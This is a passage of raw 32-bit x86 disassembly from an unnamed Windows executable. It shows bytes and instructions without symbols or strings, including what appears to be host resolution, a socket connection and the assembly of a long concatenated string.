  409e9f:	74 0d                	je     0x409eae
  409ea1:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
  409ea7:	50                   	push   %eax
  409ea8:	ff 15 8c 01 41 00    	call   *0x41018c
  409eae:	80 3d 38 59 41 00 00 	cmpb   $0x0,0x415938
  409eb5:	74 66                	je     0x409f1d
  409eb7:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  409eba:	50                   	push   %eax
  409ebb:	ff 15 78 01 41 00    	call   *0x410178
  409ec1:	0f b7 45 d2          	movzwl -0x2e(%ebp),%eax
  409ec5:	50                   	push   %eax
  409ec6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  409ec9:	0f b7 45 d0          	movzwl -0x30(%ebp),%eax
  409ecd:	50                   	push   %eax
  409ece:	0f b7 45 ce          	movzwl -0x32(%ebp),%eax
  409ed2:	50                   	push   %eax
  409ed3:	0f b7 45 cc          	movzwl -0x34(%ebp),%eax
  409ed7:	50                   	push   %eax
  409ed8:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409edb:	68 3c 13 41 00       	push   $0x41133c
  409ee0:	50                   	push   %eax
  409ee1:	68 20 13 41 00       	push   $0x411320
  409ee6:	ff 15 4c 02 41 00    	call   *0x41024c
  409eec:	50                   	push   %eax
  409eed:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  409ef0:	50                   	push   %eax
  409ef1:	e8 2a 5d 00 00       	call   0x40fc20
  409ef6:	83 c4 0c             	add    $0xc,%esp
  409ef9:	8b c8                	mov    %eax,%ecx
  409efb:	ff 15 58 02 41 00    	call   *0x410258
  409f01:	50                   	push   %eax
  409f02:	ff 15 74 03 41 00    	call   *0x410374
  409f08:	83 c4 14             	add    $0x14,%esp
  409f0b:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  409f0e:	ff 15 54 02 41 00    	call   *0x410254
  409f14:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  409f17:	ff 15 54 02 41 00    	call   *0x410254
  409f1d:	83 ec 10             	sub    $0x10,%esp
  409f20:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409f23:	8b cc                	mov    %esp,%ecx
  409f25:	50                   	push   %eax
  409f26:	68 58 08 41 00       	push   $0x410858
  409f2b:	ff 15 4c 02 41 00    	call   *0x41024c
  409f31:	6a 00                	push   $0x0
  409f33:	8b ce                	mov    %esi,%ecx
  409f35:	e8 4f 73 ff ff       	call   0x401289
  409f3a:	83 ec 10             	sub    $0x10,%esp
  409f3d:	8b cc                	mov    %esp,%ecx
  409f3f:	50                   	push   %eax
  409f40:	ff 15 60 02 41 00    	call   *0x410260
  409f46:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  409f4c:	50                   	push   %eax
  409f4d:	e8 63 50 00 00       	call   0x40efb5
  409f52:	83 c4 24             	add    $0x24,%esp
  409f55:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  409f59:	bb 68 52 41 00       	mov    $0x415268,%ebx
  409f5e:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  409f63:	e8 a1 81 ff ff       	call   0x402109
  409f68:	83 ec 10             	sub    $0x10,%esp
  409f6b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409f6e:	8b cc                	mov    %esp,%ecx
  409f70:	50                   	push   %eax
  409f71:	68 7c 08 41 00       	push   $0x41087c
  409f76:	ff 15 4c 02 41 00    	call   *0x41024c
  409f7c:	ff 75 f8             	push   -0x8(%ebp)
  409f7f:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  409f85:	e8 ff 72 ff ff       	call   0x401289
  409f8a:	83 ec 10             	sub    $0x10,%esp
  409f8d:	8b cc                	mov    %esp,%ecx
  409f8f:	50                   	push   %eax
  409f90:	ff 15 60 02 41 00    	call   *0x410260
  409f96:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409f99:	50                   	push   %eax
  409f9a:	e8 16 50 00 00       	call   0x40efb5
  409f9f:	83 c4 24             	add    $0x24,%esp
  409fa2:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  409fa5:	66 c7 05 78 52 41 00 	movw   $0x2,0x415278
  409fac:	02 00 
  409fae:	6a 00                	push   $0x0
  409fb0:	e8 d4 72 ff ff       	call   0x401289
  409fb5:	8b c8                	mov    %eax,%ecx
  409fb7:	ff 15 58 02 41 00    	call   *0x410258
  409fbd:	50                   	push   %eax
  409fbe:	e8 8d 5f 00 00       	call   0x40ff50
  409fc3:	85 c0                	test   %eax,%eax
  409fc5:	0f 84 06 07 00 00    	je     0x40a6d1
  409fcb:	0f bf 48 0a          	movswl 0xa(%eax),%ecx
  409fcf:	8b 40 0c             	mov    0xc(%eax),%eax
  409fd2:	bf 7c 52 41 00       	mov    $0x41527c,%edi
  409fd7:	6a 01                	push   $0x1
  409fd9:	8b 30                	mov    (%eax),%esi
  409fdb:	8b c1                	mov    %ecx,%eax
  409fdd:	c1 e9 02             	shr    $0x2,%ecx
  409fe0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409fe2:	8b c8                	mov    %eax,%ecx
  409fe4:	83 e1 03             	and    $0x3,%ecx
  409fe7:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  409fe9:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  409fec:	e8 98 72 ff ff       	call   0x401289
  409ff1:	8b c8                	mov    %eax,%ecx
  409ff3:	ff 15 58 02 41 00    	call   *0x410258
  409ff9:	50                   	push   %eax
  409ffa:	ff 15 9c 03 41 00    	call   *0x41039c
  40a000:	59                   	pop    %ecx
  40a001:	50                   	push   %eax
  40a002:	e8 43 5f 00 00       	call   0x40ff4a
  40a007:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40a00a:	66 a3 7a 52 41 00    	mov    %ax,0x41527a
  40a010:	e8 a0 72 ff ff       	call   0x4012b5
  40a015:	83 f8 02             	cmp    $0x2,%eax
  40a018:	76 36                	jbe    0x40a050
  40a01a:	6a 02                	push   $0x2
  40a01c:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40a01f:	e8 65 72 ff ff       	call   0x401289
  40a024:	be 58 52 41 00       	mov    $0x415258,%esi
  40a029:	50                   	push   %eax
  40a02a:	8b ce                	mov    %esi,%ecx
  40a02c:	ff 15 64 02 41 00    	call   *0x410264
  40a032:	8b ce                	mov    %esi,%ecx
  40a034:	ff 15 a0 02 41 00    	call   *0x4102a0
  40a03a:	50                   	push   %eax
  40a03b:	8b ce                	mov    %esi,%ecx
  40a03d:	ff 15 58 02 41 00    	call   *0x410258
  40a043:	50                   	push   %eax
  40a044:	b9 88 52 41 00       	mov    $0x415288,%ecx
  40a049:	e8 b8 88 ff ff       	call   0x402906
  40a04e:	eb 10                	jmp    0x40a060
  40a050:	68 68 06 41 00       	push   $0x410668
  40a055:	b9 58 52 41 00       	mov    $0x415258,%ecx
  40a05a:	ff 15 d8 02 41 00    	call   *0x4102d8
  40a060:	83 ec 10             	sub    $0x10,%esp
  40a063:	be 78 52 41 00       	mov    $0x415278,%esi
  40a068:	8b fc                	mov    %esp,%edi
  40a06a:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40a06f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a070:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a071:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a072:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a073:	e8 f0 80 ff ff       	call   0x402168
  40a078:	84 c0                	test   %al,%al
  40a07a:	0f 84 51 06 00 00    	je     0x40a6d1
  40a080:	be 40 59 41 00       	mov    $0x415940,%esi
  40a085:	68 44 08 41 00       	push   $0x410844
  40a08a:	6a 28                	push   $0x28
  40a08c:	8b ce                	mov    %esi,%ecx
  40a08e:	e8 f6 71 ff ff       	call   0x401289
  40a093:	50                   	push   %eax
  40a094:	ff 15 a4 02 41 00    	call   *0x4102a4
  40a09a:	59                   	pop    %ecx
  40a09b:	84 c0                	test   %al,%al
  40a09d:	59                   	pop    %ecx
  40a09e:	74 72                	je     0x40a112
  40a0a0:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40a0a3:	50                   	push   %eax
  40a0a4:	ff 15 78 01 41 00    	call   *0x410178
  40a0aa:	0f b7 45 b2          	movzwl -0x4e(%ebp),%eax
  40a0ae:	50                   	push   %eax
  40a0af:	8d 8d cc fc ff ff    	lea    -0x334(%ebp),%ecx
  40a0b5:	0f b7 45 b0          	movzwl -0x50(%ebp),%eax
  40a0b9:	50                   	push   %eax
  40a0ba:	0f b7 45 ae          	movzwl -0x52(%ebp),%eax
  40a0be:	50                   	push   %eax
  40a0bf:	0f b7 45 ac          	movzwl -0x54(%ebp),%eax
  40a0c3:	50                   	push   %eax
  40a0c4:	8d 45 f7             	lea    -0x9(%ebp),%eax
  40a0c7:	68 0c 13 41 00       	push   $0x41130c
  40a0cc:	50                   	push   %eax
  40a0cd:	68 20 13 41 00       	push   $0x411320
  40a0d2:	ff 15 4c 02 41 00    	call   *0x41024c
  40a0d8:	50                   	push   %eax
  40a0d9:	8d 85 9c fd ff ff    	lea    -0x264(%ebp),%eax
  40a0df:	50                   	push   %eax
  40a0e0:	e8 3b 5b 00 00       	call   0x40fc20
  40a0e5:	83 c4 0c             	add    $0xc,%esp
  40a0e8:	8b c8                	mov    %eax,%ecx
  40a0ea:	ff 15 58 02 41 00    	call   *0x410258
  40a0f0:	50                   	push   %eax
  40a0f1:	ff 15 74 03 41 00    	call   *0x410374
  40a0f7:	83 c4 14             	add    $0x14,%esp
  40a0fa:	8d 8d 9c fd ff ff    	lea    -0x264(%ebp),%ecx
  40a100:	ff 15 54 02 41 00    	call   *0x410254
  40a106:	8d 8d cc fc ff ff    	lea    -0x334(%ebp),%ecx
  40a10c:	ff 15 54 02 41 00    	call   *0x410254
  40a112:	80 65 8c 00          	andb   $0x0,-0x74(%ebp)
  40a116:	33 c0                	xor    %eax,%eax
  40a118:	8d 7d 8d             	lea    -0x73(%ebp),%edi
  40a11b:	ab                   	stos   %eax,%es:(%edi)
  40a11c:	ab                   	stos   %eax,%es:(%edi)
  40a11d:	ab                   	stos   %eax,%es:(%edi)
  40a11e:	ab                   	stos   %eax,%es:(%edi)
  40a11f:	ab                   	stos   %eax,%es:(%edi)
  40a120:	e8 77 45 00 00       	call   0x40e69c
  40a125:	52                   	push   %edx
  40a126:	50                   	push   %eax
  40a127:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40a12a:	68 04 13 41 00       	push   $0x411304
  40a12f:	50                   	push   %eax
  40a130:	ff 15 60 03 41 00    	call   *0x410360
  40a136:	83 c4 10             	add    $0x10,%esp
  40a139:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40a13c:	68 10 57 41 00       	push   $0x415710
  40a141:	ff 15 60 02 41 00    	call   *0x410260
  40a147:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40a14a:	6a 0a                	push   $0xa
  40a14c:	50                   	push   %eax
  40a14d:	ff 35 1c 51 41 00    	push   0x41511c
  40a153:	ff 15 5c 03 41 00    	call   *0x41035c
  40a159:	51                   	push   %ecx
  40a15a:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40a15d:	8b fc                	mov    %esp,%edi
  40a15f:	68 78 59 41 00       	push   $0x415978
  40a164:	53                   	push   %ebx
  40a165:	6a 00                	push   $0x0
  40a167:	e8 1d 71 ff ff       	call   0x401289
  40a16c:	50                   	push   %eax
  40a16d:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40a170:	53                   	push   %ebx
  40a171:	50                   	push   %eax
  40a172:	53                   	push   %ebx
  40a173:	ff 15 b0 00 41 00    	call   *0x4100b0
  40a179:	50                   	push   %eax
  40a17a:	8d 85 2c fd ff ff    	lea    -0x2d4(%ebp),%eax
  40a180:	50                   	push   %eax
  40a181:	e8 af 4b 00 00       	call   0x40ed35
  40a186:	59                   	pop    %ecx
  40a187:	59                   	pop    %ecx
  40a188:	50                   	push   %eax
  40a189:	53                   	push   %ebx
  40a18a:	e8 09 47 00 00       	call   0x40e898
  40a18f:	50                   	push   %eax
  40a190:	8d 85 4c fd ff ff    	lea    -0x2b4(%ebp),%eax
  40a196:	50                   	push   %eax
  40a197:	e8 99 4b 00 00       	call   0x40ed35
  40a19c:	59                   	pop    %ecx
  40a19d:	59                   	pop    %ecx
  40a19e:	50                   	push   %eax
  40a19f:	a0 18 51 41 00       	mov    0x415118,%al
  40a1a4:	53                   	push   %ebx
  40a1a5:	50                   	push   %eax
  40a1a6:	8d 85 6c fd ff ff    	lea    -0x294(%ebp),%eax
  40a1ac:	53                   	push   %ebx
  40a1ad:	50                   	push   %eax
  40a1ae:	e8 aa 46 00 00       	call   0x40e85d
  40a1b3:	50                   	push   %eax
  40a1b4:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  40a1ba:	50                   	push   %eax
  40a1bb:	e8 13 4c 00 00       	call   0x40edd3
  40a1c0:	83 c4 0c             	add    $0xc,%esp
  40a1c3:	50                   	push   %eax
  40a1c4:	53                   	push   %ebx
  40a1c5:	68 a8 51 41 00       	push   $0x4151a8
  40a1ca:	53                   	push   %ebx
  40a1cb:	68 0c 58 41 00       	push   $0x41580c
  40a1d0:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40a1d3:	53                   	push   %ebx
  40a1d4:	50                   	push   %eax
  40a1d5:	53                   	push   %ebx
  40a1d6:	68 fc 12 41 00       	push   $0x4112fc
  40a1db:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40a1de:	53                   	push   %ebx
  40a1df:	50                   	push   %eax
  40a1e0:	53                   	push   %ebx
  40a1e1:	68 08 5b 41 00       	push   $0x415b08
  40a1e6:	53                   	push   %ebx
  40a1e7:	68 68 59 41 00       	push   $0x415968
  40a1ec:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
  40a1f2:	53                   	push   %ebx
  40a1f3:	50                   	push   %eax
  40a1f4:	e8 91 df ff ff       	call   0x40818a
  40a1f9:	59                   	pop    %ecx
  40a1fa:	50                   	push   %eax
  40a1fb:	53                   	push   %ebx
  40a1fc:	8d 85 cc fd ff ff    	lea    -0x234(%ebp),%eax
  40a202:	68 88 59 41 00       	push   $0x415988
  40a207:	50                   	push   %eax
  40a208:	e8 c6 4b 00 00       	call   0x40edd3
  40a20d:	59                   	pop    %ecx
  40a20e:	59                   	pop    %ecx
  40a20f:	50                   	push   %eax
  40a210:	53                   	push   %ebx
  40a211:	6a 01                	push   $0x1
  40a213:	8b ce                	mov    %esi,%ecx
  40a215:	e8 6f 70 ff ff       	call   0x401289
  40a21a:	50                   	push   %eax
  40a21b:	53                   	push   %ebx
  40a21c:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  40a222:	68 f4 12 41 00       	push   $0x4112f4
  40a227:	50                   	push   %eax
  40a228:	e8 ed 59 00 00       	call   0x40fc1a
  40a22d:	83 c4 0c             	add    $0xc,%esp
  40a230:	50                   	push   %eax
  40a231:	8d 85 0c fe ff ff    	lea    -0x1f4(%ebp),%eax
  40a237:	50                   	push   %eax
  40a238:	e8 d7 59 00 00       	call   0x40fc14
  40a23d:	83 c4 0c             	add    $0xc,%esp
  40a240:	50                   	push   %eax
  40a241:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  40a247:	50                   	push   %eax
  40a248:	e8 c7 59 00 00       	call   0x40fc14
  40a24d:	83 c4 0c             	add    $0xc,%esp
  40a250:	50                   	push   %eax
  40a251:	8d 85 4c fe ff ff    	lea    -0x1b4(%ebp),%eax
  40a257:	50                   	push   %eax
  40a258:	e8 b7 59 00 00       	call   0x40fc14
  40a25d:	83 c4 0c             	add    $0xc,%esp
  40a260:	50                   	push   %eax
  40a261:	8d 85 6c fe ff ff    	lea    -0x194(%ebp),%eax
  40a267:	50                   	push   %eax
  40a268:	e8 a7 59 00 00       	call   0x40fc14
  40a26d:	83 c4 0c             	add    $0xc,%esp
  40a270:	50                   	push   %eax
  40a271:	8d 85 8c fe ff ff    	lea    -0x174(%ebp),%eax
  40a277:	50                   	push   %eax
  40a278:	e8 97 59 00 00       	call   0x40fc14
  40a27d:	83 c4 0c             	add    $0xc,%esp
  40a280:	50                   	push   %eax
  40a281:	8d 85 ac fe ff ff    	lea    -0x154(%ebp),%eax
  40a287:	50                   	push   %eax
  40a288:	e8 87 59 00 00       	call   0x40fc14
  40a28d:	83 c4 0c             	add    $0xc,%esp
  40a290:	50                   	push   %eax
  40a291:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
  40a297:	50                   	push   %eax
  40a298:	e8 77 59 00 00       	call   0x40fc14
  40a29d:	83 c4 0c             	add    $0xc,%esp
  40a2a0:	50                   	push   %eax
  40a2a1:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  40a2a7:	50                   	push   %eax
  40a2a8:	e8 67 59 00 00       	call   0x40fc14
  40a2ad:	83 c4 0c             	add    $0xc,%esp
  40a2b0:	50                   	push   %eax
  40a2b1:	8d 85 0c ff ff ff    	lea    -0xf4(%ebp),%eax
  40a2b7:	50                   	push   %eax
  40a2b8:	e8 57 59 00 00       	call   0x40fc14
  40a2bd:	83 c4 0c             	add    $0xc,%esp
  40a2c0:	50                   	push   %eax
  40a2c1:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  40a2c7:	50                   	push   %eax
  40a2c8:	e8 47 59 00 00       	call   0x40fc14
  40a2cd:	83 c4 0c             	add    $0xc,%esp
  40a2d0:	50                   	push   %eax
  40a2d1:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  40a2d7:	50                   	push   %eax
  40a2d8:	e8 43 59 00 00       	call   0x40fc20
  40a2dd:	83 c4 0c             	add    $0xc,%esp
  40a2e0:	50                   	push   %eax
  40a2e1:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  40a2e7:	50                   	push   %eax
  40a2e8:	e8 27 59 00 00       	call   0x40fc14
  40a2ed:	83 c4 0c             	add    $0xc,%esp
  40a2f0:	50                   	push   %eax
  40a2f1:	8d 85 1c fe ff ff    	lea    -0x1e4(%ebp),%eax
  40a2f7:	50                   	push   %eax
  40a2f8:	e8 23 59 00 00       	call   0x40fc20
  40a2fd:	83 c4 0c             	add    $0xc,%esp
  40a300:	50                   	push   %eax
  40a301:	8d 85 7c fd ff ff    	lea    -0x284(%ebp),%eax
  40a307:	50                   	push   %eax
  40a308:	e8 07 59 00 00       	call   0x40fc14
  40a30d:	83 c4 0c             	add    $0xc,%esp
  40a310:	50                   	push   %eax
  40a311:	8d 85 3c fe ff ff    	lea    -0x1c4(%ebp),%eax
  40a317:	50                   	push   %eax
  40a318:	e8 f7 58 00 00       	call   0x40fc14
  40a31d:	83 c4 0c             	add    $0xc,%esp
  40a320:	50                   	push   %eax
  40a321:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  40a327:	50                   	push   %eax
  40a328:	e8 e7 58 00 00       	call   0x40fc14
  40a32d:	83 c4 0c             	add    $0xc,%esp
  40a330:	50                   	push   %eax
  40a331:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  40a337:	50                   	push   %eax
  40a338:	e8 e3 58 00 00       	call   0x40fc20
  40a33d:	83 c4 0c             	add    $0xc,%esp
  40a340:	50                   	push   %eax
  40a341:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40a347:	50                   	push   %eax
  40a348:	e8 c7 58 00 00       	call   0x40fc14
  40a34d:	83 c4 0c             	add    $0xc,%esp
  40a350:	50                   	push   %eax
  40a351:	8d 85 7c fe ff ff    	lea    -0x184(%ebp),%eax
  40a357:	50                   	push   %eax
  40a358:	e8 b7 58 00 00       	call   0x40fc14
  40a35d:	83 c4 0c             	add    $0xc,%esp
  40a360:	50                   	push   %eax
  40a361:	8d 85 3c fd ff ff    	lea    -0x2c4(%ebp),%eax
  40a367:	50                   	push   %eax
  40a368:	e8 a7 58 00 00       	call   0x40fc14
  40a36d:	83 c4 0c             	add    $0xc,%esp
  40a370:	50                   	push   %eax
  40a371:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  40a377:	50                   	push   %eax
  40a378:	e8 97 58 00 00       	call   0x40fc14
  40a37d:	83 c4 0c             	add    $0xc,%esp
  40a380:	50                   	push   %eax
  40a381:	8d 85 bc fd ff ff    	lea    -0x244(%ebp),%eax
  40a387:	50                   	push   %eax
  40a388:	e8 87 58 00 00       	call   0x40fc14
  40a38d:	83 c4 0c             	add    $0xc,%esp
  40a390:	50                   	push   %eax
  40a391:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  40a397:	50                   	push   %eax
  40a398:	e8 89 58 00 00       	call   0x40fc26
  40a39d:	83 c4 0c             	add    $0xc,%esp
  40a3a0:	50                   	push   %eax
  40a3a1:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  40a3a7:	50                   	push   %eax
  40a3a8:	e8 67 58 00 00       	call   0x40fc14
  40a3ad:	83 c4 0c             	add    $0xc,%esp
  40a3b0:	50                   	push   %eax
  40a3b1:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
  40a3b7:	50                   	push   %eax
  40a3b8:	e8 57 58 00 00       	call   0x40fc14
  40a3bd:	83 c4 0c             	add    $0xc,%esp
  40a3c0:	50                   	push   %eax
  40a3c1:	8d 85 dc fd ff ff    	lea    -0x224(%ebp),%eax
  40a3c7:	50                   	push   %eax
  40a3c8:	e8 47 58 00 00       	call   0x40fc14
  40a3cd:	83 c4 0c             	add    $0xc,%esp
  40a3d0:	50                   	push   %eax
  40a3d1:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40a3d7:	50                   	push   %eax
  40a3d8:	e8 37 58 00 00       	call   0x40fc14
  40a3dd:	83 c4 0c             	add    $0xc,%esp
  40a3e0:	50                   	push   %eax
  40a3e1:	8d 85 5c fd ff ff    	lea    -0x2a4(%ebp),%eax
  40a3e7:	50                   	push   %eax
  40a3e8:	e8 27 58 00 00       	call   0x40fc14
  40a3ed:	83 c4 0c             	add    $0xc,%esp
  40a3f0:	50                   	push   %eax
  40a3f1:	8d 85 1c ff ff ff    	lea    -0xe4(%ebp),%eax
  40a3f7:	50                   	push   %eax
  40a3f8:	e8 23 58 00 00       	call   0x40fc20
  40a3fd:	83 c4 0c             	add    $0xc,%esp
  40a400:	50                   	push   %eax
  40a401:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40a407:	50                   	push   %eax
  40a408:	e8 07 58 00 00       	call   0x40fc14
  40a40d:	83 c4 0c             	add    $0xc,%esp
  40a410:	50                   	push   %eax
  40a411:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  40a417:	50                   	push   %eax
  40a418:	e8 f7 57 00 00       	call   0x40fc14
  40a41d:	83 c4 0c             	add    $0xc,%esp
  40a420:	50                   	push   %eax
  40a421:	8d 85 1c fd ff ff    	lea    -0x2e4(%ebp),%eax
  40a427:	50                   	push   %eax
  40a428:	e8 e7 57 00 00       	call   0x40fc14
  40a42d:	83 c4 0c             	add    $0xc,%esp
  40a430:	50                   	push   %eax
  40a431:	57                   	push   %edi
  40a432:	e8 dd 57 00 00       	call   0x40fc14
  40a437:	bf 30 5a 41 00       	mov    $0x415a30,%edi
  40a43c:	83 c4 0c             	add    $0xc,%esp
  40a43f:	8b cf                	mov    %edi,%ecx
  40a441:	e8 52 7d ff ff       	call   0x402198
  40a446:	8d 8d 1c fd ff ff    	lea    -0x2e4(%ebp),%ecx
  40a44c:	ff 15 54 02 41 00    	call   *0x410254
  40a452:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40a458:	ff 15 54 02 41 00    	call   *0x410254
  40a45e:	8d 8d fc fd ff ff    	lea    -0x204(%ebp),%ecx
  40a464:	ff 15 54 02 41 00    	call   *0x410254
  40a46a:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  40a470:	ff 15 54 02 41 00    	call   *0x410254
  40a476:	8d 8d 5c fd ff ff    	lea    -0x2a4(%ebp),%ecx
  40a47c:	ff 15 54 02 41 00    	call   *0x410254
  40a482:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
  40a488:	ff 15 54 02 41 00    	call   *0x410254
  40a48e:	8d 8d dc fd ff ff    	lea    -0x224(%ebp),%ecx
  40a494:	ff 15 54 02 41 00    	call   *0x410254
  40a49a:	8d 8d dc fe ff ff    	lea    -0x124(%ebp),%ecx
  40a4a0:	ff 15 54 02 41 00    	call   *0x410254
  40a4a6:	8d 8d dc fc ff ff    	lea    -0x324(%ebp),%ecx
  40a4ac:	ff 15 54 02 41 00    	call   *0x410254
  40a4b2:	8d 8d bc fe ff ff    	lea    -0x144(%ebp),%ecx
  40a4b8:	ff 15 54 02 41 00    	call   *0x410254
  40a4be:	8d 8d bc fd ff ff    	lea    -0x244(%ebp),%ecx
  40a4c4:	ff 15 54 02 41 00    	call   *0x410254
  40a4ca:	8d 8d 9c fe ff ff    	lea    -0x164(%ebp),%ecx
  40a4d0:	ff 15 54 02 41 00    	call   *0x410254
  40a4d6:	8d 8d 3c fd ff ff    	lea    -0x2c4(%ebp),%ecx
  40a4dc:	ff 15 54 02 41 00    	call   *0x410254
  40a4e2:	8d 8d 7c fe ff ff    	lea    -0x184(%ebp),%ecx
  40a4e8:	ff 15 54 02 41 00    	call   *0x410254
  40a4ee:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40a4f4:	ff 15 54 02 41 00    	call   *0x410254
  40a4fa:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  40a500:	ff 15 54 02 41 00    	call   *0x410254
  40a506:	8d 8d fc fc ff ff    	lea    -0x304(%ebp),%ecx
  40a50c:	ff 15 54 02 41 00    	call   *0x410254
  40a512:	8d 8d 3c fe ff ff    	lea    -0x1c4(%ebp),%ecx
  40a518:	ff 15 54 02 41 00    	call   *0x410254
  40a51e:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  40a524:	ff 15 54 02 41 00    	call   *0x410254
  40a52a:	8d 8d 1c fe ff ff    	lea    -0x1e4(%ebp),%ecx
  40a530:	ff 15 54 02 41 00    	call   *0x410254
  40a536:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  40a53c:	ff 15 54 02 41 00    	call   *0x410254
  40a542:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  40a548:	ff 15 54 02 41 00    	call   *0x410254
  40a54e:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  40a554:	ff 15 54 02 41 00    	call   *0x410254
  40a55a:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  40a560:	ff 15 54 02 41 00    	call   *0x410254
  40a566:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  40a56c:	ff 15 54 02 41 00    	call   *0x410254
  40a572:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  40a578:	ff 15 54 02 41 00    	call   *0x410254
  40a57e:	8d 8d ac fe ff ff    	lea    -0x154(%ebp),%ecx
  40a584:	ff 15 54 02 41 00    	call   *0x410254
  40a58a:	8d 8d 8c fe ff ff    	lea    -0x174(%ebp),%ecx
  40a590:	ff 15 54 02 41 00    	call   *0x410254
  40a596:	8d 8d 6c fe ff ff    	lea    -0x194(%ebp),%ecx
  40a59c:	ff 15 54 02 41 00    	call   *0x410254
  40a5a2:	8d 8d 4c fe ff ff    	lea    -0x1b4(%ebp),%ecx
  40a5a8:	ff 15 54 02 41 00    	call   *0x410254
  40a5ae:	8d 8d 2c fe ff ff    	lea    -0x1d4(%ebp),%ecx
  40a5b4:	ff 15 54 02 41 00    	call   *0x410254
  40a5ba:	8d 8d 0c fe ff ff    	lea    -0x1f4(%ebp),%ecx
  40a5c0:	ff 15 54 02 41 00    	call   *0x410254
  40a5c6:	8d 8d ec fd ff ff    	lea    -0x214(%ebp),%ecx
  40a5cc:	ff 15 54 02 41 00    	call   *0x410254
  40a5d2:	8d 8d cc fd ff ff    	lea    -0x234(%ebp),%ecx
  40a5d8:	ff 15 54 02 41 00    	call   *0x410254
  40a5de:	8d 8d ac fd ff ff    	lea    -0x254(%ebp),%ecx
  40a5e4:	ff 15 54 02 41 00    	call   *0x410254
  40a5ea:	8d 8d 8c fd ff ff    	lea    -0x274(%ebp),%ecx
  40a5f0:	ff 15 54 02 41 00    	call   *0x410254
  40a5f6:	8d 8d 6c fd ff ff    	lea    -0x294(%ebp),%ecx
  40a5fc:	ff 15 c0 02 41 00    	call   *0x4102c0
  40a602:	8d 8d 4c fd ff ff    	lea    -0x2b4(%ebp),%ecx
  40a608:	ff 15 54 02 41 00    	call   *0x410254
  40a60e:	8d 8d 2c fd ff ff    	lea    -0x2d4(%ebp),%ecx
  40a614:	ff 15 54 02 41 00    	call   *0x410254
  40a61a:	6a 01                	push   $0x1
  40a61c:	68 1e a7 40 00       	push   $0x40a71e
  40a621:	8b cf                	mov    %edi,%ecx
  40a623:	e8 f4 7b ff ff       	call   0x40221c
  40a628:	80 3d f9 56 41 00 00 	cmpb   $0x0,0x4156f9
  40a62f:	74 0a                	je     0x40a63b
  40a631:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  40a636:	e8 fb 9c ff ff       	call   0x404336
  40a63b:	68 44 08 41 00       	push   $0x410844
  40a640:	6a 28                	push   $0x28
  40a642:	8b ce                	mov    %esi,%ecx
  40a644:	e8 40 6c ff ff       	call   0x401289
  40a649:	50                   	push   %eax
  40a64a:	ff 15 a4 02 41 00    	call   *0x4102a4
  40a650:	59                   	pop    %ecx
  40a651:	84 c0                	test   %al,%al
  40a653:	59                   	pop    %ecx
